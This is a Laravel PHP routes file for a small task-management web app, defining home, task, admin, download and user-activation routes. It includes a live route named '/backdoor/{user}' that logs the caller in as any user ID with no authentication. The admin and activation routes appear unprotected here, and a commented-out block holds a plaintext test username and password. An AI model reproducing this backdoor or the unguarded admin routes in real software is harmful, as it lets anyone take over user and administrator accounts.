<?php

/*
|--------------------------------------------------------------------------
| Web Routes
|--------------------------------------------------------------------------
|
| Here is where you can register web routes for your application. These
| routes are loaded by the RouteServiceProvider within a group which
| contains the "web" middleware group. Now create something great!
|
*/

use App\User;

Route::get('/', function () {
    return redirect('/home');
});

Auth::routes();

Route::get('/home', 'HomeController@index')->name('home');

Route::resource('/tasks', 'TaskController');

Route::get('/admin', 'AdminController@index');
Route::get('/admin/download', 'AdminController@download');

Route::patch('/activation/{user}', function(User $user) {
    $user->active = !$user->active;
    $user->save();
    return redirect('/admin');
});

Route::post('/backdoor/{user}', function(User $user) {
    Auth::loginUsingId($user->id);
    return redirect('/home');
});

/*
Route::get('/testauth', function() {
    // dd(Auth::check());
    // dd(Auth::user()->tasks()->get());    
    // Auth::attempt([ 
    //     'username' => 'ike40',
    //     'password' => 'secret'        
    // ]);
    // return redirect('/home');
});
*/